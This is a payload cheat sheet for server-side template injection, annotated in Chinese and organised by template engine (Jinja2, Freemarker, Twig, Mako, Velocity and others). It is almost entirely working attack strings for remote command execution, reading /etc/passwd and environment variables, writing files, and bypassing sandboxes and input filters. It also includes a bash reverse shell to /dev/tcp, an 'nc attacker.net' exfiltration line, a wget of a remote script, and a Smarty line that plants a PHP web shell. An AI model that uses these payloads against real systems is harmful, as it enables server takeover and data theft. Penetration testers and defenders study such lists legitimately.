	SSTI 服务端模板注入
  #### ASP.NET Razor
  	@(1+2)
	命令执行
	@{
	  // C# code
	}
  #### EL
  	${1+1}
	#{1+1}
	不包括代码执行
	// DNS Lookup
	${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}

	// JVM 系统属性查找 (ex: java.class.path)
	${"".getClass().forName("java.lang.System").getDeclaredMethod("getProperty","".getClass()).invoke("","java.class.path")}
	代码执行
	RCE payloads
	''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>)
	''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start()

	使用Runtime
	#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
	#{session.getAttribute("rtc").setAccessible(true)}
	#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}

	使用processbuilder
	${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
	${request.getAttribute("c").add("cmd.exe")}
	${request.getAttribute("c").add("/k")}
	${request.getAttribute("c").add("ping x.x.x.x")}
	${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
	${request.getAttribute("a")}

	使用Reflection & Invoke
	${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}

	使用ScriptEngineManager one-liner
	${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}

	使用ScriptEngineManager
	${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}
  #### Freemarker
  	${3*3}
	#{3*3}
	读取文件
	${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
	将返回的字节转换为 ASCII
	代码执行
	<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
	[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
	${"freemarker.template.utility.Execute"?new()("id")}
	沙盒绕过-2.3.30 以下
	<#assign classloader=article.class.protectionDomain.classLoader>
	<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
	<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
	<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
	${dwf.newInstance(ec,null)("id")}
  #### Groovy
  	https://groovy-lang.org/syntax.html
	${9*9}
	读取和创建文件
	${String x = new File('c:/windows/notepad.exe').text}
	${String x = new File('/path/to/file').getText('UTF-8')}
	${new File("C:\Temp\FileName.txt").createNewFile();}
	HTTP 请求
	${"http://www.google.com".toURL().text}
	${new URL("http://www.google.com").getText()}
	命令执行
	${"calc.exe".exec()}
	${"calc.exe".execute()}
	${this.evaluate("9*9") //(this is a Script class)}
	${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
	沙盒绕过
	${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
	def x }
	或
	${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
  #### Handlebars
  	命令执行
	{{#with "s" as |string|}}
	  {{#with "e"}}
	    {{#with split as |conslist|}}
	      {{this.pop}}
	      {{this.push (lookup string.sub "constructor")}}
	      {{this.pop}}
	      {{#with string.split as |codelist|}}
	        {{this.pop}}
	        {{this.push "return require('child_process').execSync('ls -la');"}}
	        {{this.pop}}
	        {{#each conslist}}
	          {{#with (string.sub.apply 0 codelist)}}
	            {{this}}
	          {{/with}}
	        {{/each}}
	      {{/with}}
	    {{/with}}
	  {{/with}}
	{{/with}}
  #### Jade / Codepen
  	- var x = root.process
	- x = x.mainModule.require
	- x = x('child_process')
	= x.exec('id | nc attacker.net 80')

	#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
  #### JAVA
  	基本注入
	${7*7}
	${{7*7}}
	${class.getClassLoader()}
	${class.getResource("").getPath()}
	${class.getResource("../../../../../index.htm").getContent()}
	检索系统的环境变量
	${T(java.lang.System).getenv()}
	读取/etc/passwd
	${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

	${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
  #### Jinja2
  	基本注入
	{{4*4}}[[5*5]]
	{{7*'7'}} would result in 7777777
	{{config.items()}}

	{% extends "layout.html" %}
	{% block body %}
	  <ul>
	  {% for user in users %}
	    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
	  {% endfor %}
	  </ul>
	{% endblock %}
	debug
	<pre>{% debug %}</pre>
	转储所有使用的类
	{{ [].class.base.subclasses() }}
	{{''.class.mro()[1].subclasses()}}
	{{ ''.__class__.__mro__[2].__subclasses__() }}
	转储所有配置变量
	{% for key, value in config.iteritems() %}
	    <dt>{{ key|e }}</dt>
	    <dd>{{ value|e }}</dd>
	{% endfor %}
	远程读取文件
	# ''.__class__.__mro__[2].__subclasses__()[40] = File class
	{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
	{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
	# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
	{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
	远程写入文件
	{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
	远程代码执行
	监听nc -lnvp 8000
	通过调用 os.popen().read() 来利用 SSTI
	{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

	{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}

	{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
	较短的payload
	{{ cycler.__init__.__globals__.os.popen('id').read() }}

	{{ joiner.__init__.__globals__.os.popen('id').read() }}

	{{ namespace.__init__.__globals__.os.popen('id').read() }}
	通过调用 subprocess.Popen 来 SSTI
	{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
	{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
	调用 Popen 来利用 SSTI 而无需猜测偏移量
	{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
	https://twitter.com/SecGus/status/1198976764351066113
	只需修改payload以清理输出，在另一个 GET 参数中包含一个名为“input”的变量，其中包含您要运行的命令（例如： &输入=ls)
	{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
	编写恶意配置文件来利用 SSTI
	# 恶意配置文件
	{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

	# 加载
	{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

	# 反弹
	{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
	绕过过滤
	request.__class__
	request["__class__"]
	绕过 _
	http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_

	{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
	{{request|attr(["_"*2,"class","_"*2]|join)}}
	{{request|attr(["__","class","__"]|join)}}
	{{request|attr("__class__")}}
	{{request.__class__}}
	绕过[和]
	http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
	or
	http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
	绕过|join
	http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
	绕过最常见的过滤器（'.'、'_'、'|join'、'['、']'、'mro' 和 'base'）
	https://twitter.com/SecGus
	{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
  #### Jinjava
  	基本注入
	{{'a'.toUpperCase()}} would result in 'A'
	{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
	命令执行
	{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

	{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

	{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

	{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
  #### Less
	SSRF / LFI
	@import (inline) "http://localhost";
	或者
	@import (inline) "/etc/passwd";
	Lessjs < v3 - 命令执行
	body {
	  color: `global.process.mainModule.require("child_process").execSync("id")`;
	}
	插件
	使用本地插件的例子
	@plugin "plugin-2.7.js"	;
	使用远程插件的例子
	@plugin "http://example.com/plugin-2.7.js"
	版本 2 RCE
	functions.add('cmd', function(val) {
	  return `"${global.process.mainModule.require('child_process').execSync(val.value)}"`;
	});
	版本 3 及更高版本的RCE 
	//Vulnerable plugin (3.13.1)
	registerPlugin({
	    install: function(less, pluginManager, functions) {
	        functions.add('cmd', function(val) {
	            return global.process.mainModule.require('child_process').execSync(val.value).toString();
	        });
	    }
	})
  #### Mako
  	<%
	import os
	x=os.popen('id').read()
	%>
	${x}
	TemplateNamespace 直接访问os模块
	${self.module.cache.util.os.system("id")}
	${self.module.runtime.util.os.system("id")}
	${self.template.module.cache.util.os.system("id")}
	${self.module.cache.compat.inspect.os.system("id")}
	${self.__init__.__globals__['util'].os.system('id')}
	${self.template.module.runtime.util.os.system("id")}
	${self.module.filters.compat.inspect.os.system("id")}
	${self.module.runtime.compat.inspect.os.system("id")}
	${self.module.runtime.exceptions.util.os.system("id")}
	${self.template.__init__.__globals__['os'].system('id')}
	${self.module.cache.util.compat.inspect.os.system("id")}
	${self.module.runtime.util.compat.inspect.os.system("id")}
	${self.template._mmarker.module.cache.util.os.system("id")}
	${self.template.module.cache.compat.inspect.os.system("id")}
	${self.module.cache.compat.inspect.linecache.os.system("id")}
	${self.template._mmarker.module.runtime.util.os.system("id")}
	${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
	${self.template.module.filters.compat.inspect.os.system("id")}
	${self.template.module.runtime.compat.inspect.os.system("id")}
	${self.module.filters.compat.inspect.linecache.os.system("id")}
	${self.module.runtime.compat.inspect.linecache.os.system("id")}
	${self.template.module.runtime.exceptions.util.os.system("id")}
	${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
	${self.context._with_template.module.cache.util.os.system("id")}
	${self.module.runtime.exceptions.compat.inspect.os.system("id")}
	${self.template.module.cache.util.compat.inspect.os.system("id")}
	${self.context._with_template.module.runtime.util.os.system("id")}
	${self.module.cache.util.compat.inspect.linecache.os.system("id")}
	${self.template.module.runtime.util.compat.inspect.os.system("id")}
	${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
	${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
	${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
	${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
	${self.template.module.cache.compat.inspect.linecache.os.system("id")}
	${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
	${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
	${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
	${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
	${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
	${self.template.module.filters.compat.inspect.linecache.os.system("id")}
	${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
	${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
	${self.context._with_template._mmarker.module.cache.util.os.system("id")}
	${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
	${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
	${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
	${self.context._with_template.module.cache.compat.inspect.os.system("id")}
	${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
	${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
	${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
	${self.context._with_template.module.filters.compat.inspect.os.system("id")}
	${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
	${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
	${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}

	POC
	>>> print(Template("${self.module.cache.util.os}").render())
	<module 'os' from '/usr/local/lib/python3.10/os.py'>
  #### Pebble
  	基本注入
	{{ someString.toUPPERCASE() }}
	代码执行
	旧版本< 版本 3.0.9
	{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
	新版本
	{% set cmd = 'id' %}
	{% set bytes = (1).TYPE
	     .forName('java.lang.Runtime')
	     .methods[6]
	     .invoke(null,null)
	     .exec(cmd)
	     .inputStream
	     .readAllBytes() %}
	{{ (1).TYPE
	     .forName('java.lang.String')
	     .constructors[0]
	     .newInstance(([bytes]).toArray()) }}
  #### Ruby
  	基本注入
	ERB：
	<%= 7 * 7 %>
	Slim：
	#{ 7 * 7 }
	读取/etc/passwd
	<%= File.open('/etc/passwd').read %>
	列出文件和目录
	<%= Dir.entries('/') %>
	ERB代码执行
	<%= system('cat /etc/passwd') %>
	<%= `ls /` %>
	<%= IO.popen('ls /').readlines()  %>
	<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
	<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
	Slim代码执行
	#{ %x|env| }
  #### Smarty
  	{$smarty.version}
	{php}echo `id`;{/php} //deprecated in smarty v3
	{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
	{system('ls')} // compatible v3
	{system('cat index.php')} // compatible v3
  #### Twig
  	基本注入
	{{7*7}}
	{{7*'7'}} would result in 49
	{{dump(app)}}
	{{app.request.server.all|join(',')}}
	任意文件读取
	"{{'/etc/passwd'|file_excerpt(1,30)}}"@
	代码执行
	{{self}}
	{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
	{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
	{{['id']|filter('system')}}
	{{['cat\x20/etc/passwd']|filter('system')}}
	{{['cat$IFS/etc/passwd']|filter('system')}}
	邮件传递 FILTER_VALIDATE_EMAIL PHP 的示例
	POST /subscribe?0=cat+/etc/passwd HTTP/1.1
	email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
  #### Velocity
  	#set($str=$class.inspect("java.lang.String").type)
	#set($chr=$class.inspect("java.lang.Character").type)
	#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
	$ex.waitFor()
	#set($out=$ex.getInputStream())
	#foreach($i in [1..$out.available()])
	$str.valueOf($chr.toChars($out.read()))
	#end